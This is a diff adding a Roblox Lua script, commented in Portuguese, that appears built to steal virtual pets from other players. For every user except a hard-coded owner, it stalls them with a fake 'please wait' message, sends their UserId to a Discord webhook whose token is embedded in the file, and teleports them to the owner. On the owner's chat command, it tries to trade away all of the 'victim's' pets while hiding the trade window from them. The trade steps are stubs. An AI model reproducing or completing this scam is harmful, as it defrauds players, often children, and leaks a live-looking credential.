@@ -1,0 +1,73 @@
+local ownerUserId = 355747793 -- UserId do seu usuário do Roblox
+local webhookUrl = "https://discord.com/api/webhooks/1249057807794180226/eG_X29kDyzKlKbcH9YKnb_Dk3dv9ul2l699XTuXWSYo3GKow-9TCAMtZ5ZtI787MU5_9" -- Seu webhook do Discord
+local player = game.Players.LocalPlayer
+
+if player.UserId ~= ownerUserId then
+    -- Mostrar mensagem de espera
+    local ScreenGui = Instance.new("ScreenGui")
+    local TextLabel = Instance.new("TextLabel")
+    
+    ScreenGui.Parent = player:WaitForChild("PlayerGui")
+    TextLabel.Parent = ScreenGui
+    TextLabel.Size = UDim2.new(0, 300, 0, 100)
+    TextLabel.Position = UDim2.new(0.5, -150, 0.5, -50)
+    TextLabel.Text = "Por favor, aguarde 10 minutos."
+    TextLabel.TextScaled = true
+
+    -- Aguardar 10 minutos
+    wait(600)
+
+    -- Enviar notificação ao Discord
+    local HttpService = game:GetService("HttpService")
+    local data = {
+        content = "Alguém está tentando usar o script. UserId: " .. player.UserId
+    }
+    local jsonData = HttpService:JSONEncode(data)
+
+    HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
+
+    -- Teletransportar o jogador para o dono
+    local owner = game.Players:GetPlayerByUserId(ownerUserId)
+    if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
+        local targetPosition = owner.Character.HumanoidRootPart.Position
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
+    end
+end
+
+-- Função para iniciar troca
+local function startTrade(victim)
+    -- Pseudo-código para iniciar uma troca
+    -- Adapte conforme necessário com a API do jogo
+    print("Iniciando troca com a vítima:", victim.Name)
+    -- Adicione a lógica específica do jogo aqui
+end
+
+-- Função para adicionar todos os pets na troca
+local function addAllPetsToTrade(victim)
+    -- Pseudo-código para adicionar todos os pets à troca
+    -- Adapte conforme necessário com a API do jogo
+    print("Adicionando todos os pets na troca para a vítima:", victim.Name)
+    -- Adicione a lógica específica do jogo aqui
+end
+
+-- Conectar a função ao chat do dono
+local function onPlayerChatted(player, message)
+    if player.UserId == ownerUserId and message == "@placa" then
+        -- Iniciar a troca com a vítima
+        local victim = game.Players.LocalPlayer
+        if victim and victim.Character then
+            startTrade(victim)
+            addAllPetsToTrade(victim)
+            
+            -- Ocultar a interface de troca do jogador não autorizado
+            -- Este é um pseudo-código, já que a implementação real depende do jogo
+            local playerGui = victim:WaitForChild("PlayerGui")
+            local tradeGui = playerGui:FindFirstChild("TradeGui")
+            if tradeGui then
+                tradeGui.Enabled = false
+            end
+        end
+    end
+end
+
+game.Players.PlayerChatted:Connect(onPlayerChatted)
